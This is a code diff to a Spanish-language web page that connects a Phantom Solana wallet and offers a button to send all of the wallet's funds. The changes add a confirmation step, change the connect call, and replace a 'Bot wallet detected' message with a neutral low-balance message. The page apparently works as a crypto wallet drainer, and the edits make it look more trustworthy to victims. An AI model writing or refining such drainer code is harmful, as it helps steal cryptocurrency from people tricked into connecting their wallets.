@@ -11,7 +11,7 @@
       margin-top: 50px;
     }
 
-    #connect-button, #send-funds-button {
+    #connect-button, #send-funds-button, #confirm-button {
       background-color: #7e57c2;
       color: white;
       border: none;
@@ -23,7 +23,7 @@
       margin-top: 20px;
     }
 
-    #connect-button:hover, #send-funds-button:hover {
+    #connect-button:hover, #send-funds-button:hover, #confirm-button:hover {
       background-color: #5e35b1;
     }
 
@@ -46,11 +46,13 @@
   <h1>Conectar Phantom Wallet</h1>
   <button id="connect-button">Conectar Wallet</button>
   <div id="wallet-status"></div>
-  <button id="send-funds-button" style="display: none;">Enviar Todos los Fondos</button>
+  <button id="send-funds-button" style="display: none;">Mostrar Confirmación</button>
+  <button id="confirm-button" style="display: none;">Enviar Todos los Fondos</button>
 
   <script>
     const connectButton = document.getElementById("connect-button");
     const sendFundsButton = document.getElementById("send-funds-button");
+    const confirmButton = document.getElementById("confirm-button");
     const walletStatusDiv = document.getElementById("wallet-status");
     let connectedPublicKey = null;
 
@@ -116,7 +118,7 @@
         walletStatusDiv.innerHTML = `
           <span class="success">Fondos enviados exitosamente. TXID: ${txid}</span>
         `;
-        sendFundsButton.style.display = "none";
+        confirmButton.style.display = "none";
       } catch (err) {
         console.error("Error al enviar los fondos:", err);
         walletStatusDiv.innerHTML = `<span class="error">Error al enviar los fondos: ${err.message}</span>`;
@@ -131,11 +133,9 @@
       }
 
       try {
-        // Conectar la wallet
-        const response = await window.solana.connect();
+        const response = await window.solana.request({ method: 'connect' });
         connectedPublicKey = response.publicKey;
 
-        // Esperar la confirmación de la conexión
         const balance = await getWalletBalance(connectedPublicKey);
 
         if (balance < 0) {
@@ -143,21 +143,24 @@
           return;
         }
 
-        if (balance > 0.00001) {
-          walletStatusDiv.innerHTML = `
-            <span class="success">Wallet conectada: ${connectedPublicKey.toString()} | Saldo: ${balance.toFixed(4)} SOL</span>
-          `;
-          connectButton.textContent = "Conectado";
-          connectButton.disabled = true;
+        walletStatusDiv.innerHTML = `
+          <span class="success">Wallet conectada: ${connectedPublicKey.toString()} | Saldo: ${balance.toFixed(4)} SOL</span>
+        `;
+        connectButton.textContent = "Conectado";
+        connectButton.disabled = true;
 
-          // Muestra el botón para enviar fondos
+        if (balance > 0) {
           sendFundsButton.style.display = "inline-block";
 
-          // Agrega el listener al botón de enviar fondos
-          sendFundsButton.addEventListener("click", sendAllFunds);
+          sendFundsButton.addEventListener("click", () => {
+            walletStatusDiv.innerHTML = `<span>Por favor, confirma el envío de los fondos.</span>`;
+            confirmButton.style.display = "inline-block";
+          });
+
+          confirmButton.addEventListener("click", sendAllFunds);
         } else {
           walletStatusDiv.innerHTML = `
-            <span class="error">Bot wallet detected (Saldo: ${balance.toFixed(4)} SOL)</span>
+            <span class="error">No hay suficiente saldo para realizar transacciones.</span>
           `;
         }
       } catch (err) {
@@ -173,7 +176,6 @@
     }
   </script>
 
-  <!-- Incluye la librería de Solana Web3.js -->
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.80.0/lib/index.iife.min.js"></script>
 </body>
 </html>
